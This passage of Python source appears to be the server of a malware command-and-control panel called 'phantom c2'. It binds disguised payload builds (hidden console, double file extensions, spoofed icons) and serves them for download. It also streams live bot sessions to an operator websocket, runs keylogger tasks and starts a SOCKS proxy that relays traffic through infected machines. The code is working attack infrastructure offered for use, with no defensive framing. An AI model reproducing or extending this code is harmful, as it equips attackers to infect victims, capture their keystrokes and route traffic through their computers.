            console not in ("1", "true", "on"), delay,
            double_ext in ("1", "true", "on"), icon in ("1", "true", "on"),
        )
    except BuildError as e:
        raise HTTPException(400, str(e))
    await _event("build", f"bound {out.get('binary')}")
    return out


@app.get("/api/builds")
async def builds():
    return BUILDER.list_builds()


@app.get("/api/builds/{name}")
async def download_build(name: str):
    p = (BUILDER.out / name).resolve()
    if not str(p).startswith(str(BUILDER.out)) or not p.is_file():
        raise HTTPException(404, "no build")
    return FileResponse(p, filename=name)


@app.delete("/api/builds/{name}")
async def delete_build(name: str):
    p = (BUILDER.out / name).resolve()
    if str(p).startswith(str(BUILDER.out)) and p.is_file():
        p.unlink()
    return {"ok": True}


# ---------------------------------------------------------------- shell

LOGIN_HTML = os.path.join(BASE, "static", "login.html")
INDEX_HTML = os.path.join(BASE, "static", "index.html")


@app.get("/login")
async def login_page():
    return FileResponse(LOGIN_HTML)


@app.get("/")
async def index():
    return FileResponse(INDEX_HTML)


@app.websocket("/ws")
async def ws_endpoint(ws: WebSocket):
    if not _authorized(ws.headers, ws.query_params.get("token", ""), ws.cookies):
        await ws.close(code=1008)
        return
    await ws.accept()
    WS.append(ws)
    await ws.send_json({"type": "snapshot",
                        "sessions": [s.public(full=True) for s in SESSIONS.values()],
                        "events": EVENTS[-120:],
                        "stats": {"sessions": len(SESSIONS)}})
    try:
        while True:
            await ws.receive_text()
    except WebSocketDisconnect:
        pass
    finally:
        if ws in WS:
            WS.remove(ws)


async def _startup():
    restored = _restore()
    seed = int(os.environ.get("PHANTOM_SEED") or 0)
    if seed > 0 and not SESSIONS:
        _seed_demo(seed)
        print(f"[i] seeded {len(SESSIONS)} demo sessions (PHANTOM_SEED)")
    elif restored:
        print(f"[i] restored {restored} sessions from {STATE_FILE}")
    app.state.bg = [asyncio.create_task(_persist_loop()),
                    asyncio.create_task(_stream_watch())]
    cfg = CFG["socks"]
    if cfg.get("enabled"):
        try:
            await start_socks(cfg["host"], cfg["port"], pick_bot)
        except OSError as e:
            print(f"[!] socks listener failed on {cfg['host']}:{cfg['port']}: {e}")


async def _shutdown():
    for task in KEYLOG_TASKS.values():
        task.cancel()
    for task in getattr(app.state, "bg", []):
        task.cancel()
    try:
        with open(STATE_FILE, "w", encoding="utf-8") as fh:
            json.dump({"sessions": [_serialize(s) for s in SESSIONS.values()]}, fh)
    except OSError:
        pass


app.mount("/", StaticFiles(directory=os.path.join(BASE, "static"), html=True),
          name="static")


def _quiet_loop_handler(loop, context):
    exc = context.get("exception")
    if isinstance(exc, (ConnectionResetError, asyncio.TimeoutError)):
        return
    loop.default_exception_handler(context)


def main():
    tls = CFG["tls"]
    use_tls = tls["enabled"] and os.path.isfile(tls["cert"]) and os.path.isfile(tls["key"])
    uvicorn_cfg = dict(
        app=app,
        host=CFG["host"],
        port=CFG["port"],
        log_level=os.environ.get("PHANTOM_LOG", "info"),
        proxy_headers=True,
        forwarded_allow_ips="*",
        timeout_keep_alive=75,
        ws_ping_interval=20,
        ws_ping_timeout=20,
    )
    if use_tls:
        uvicorn_cfg["ssl_certfile"] = tls["cert"]
        uvicorn_cfg["ssl_keyfile"] = tls["key"]

    print(f"[*] phantom c2 on {'https' if use_tls else 'http'}://{CFG['host']}:{CFG['port']}")
    print(f"[*] callback url: {config.public_url(CFG)}")
    print(f"[*] builds: {BUILDER.out}")

    server = uvicorn.Server(uvicorn.Config(**uvicorn_cfg))
    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    loop.set_exception_handler(_quiet_loop_handler)
    try:
        loop.run_until_complete(server.serve())
    except KeyboardInterrupt:
        pass


if __name__ == "__main__":
    main()

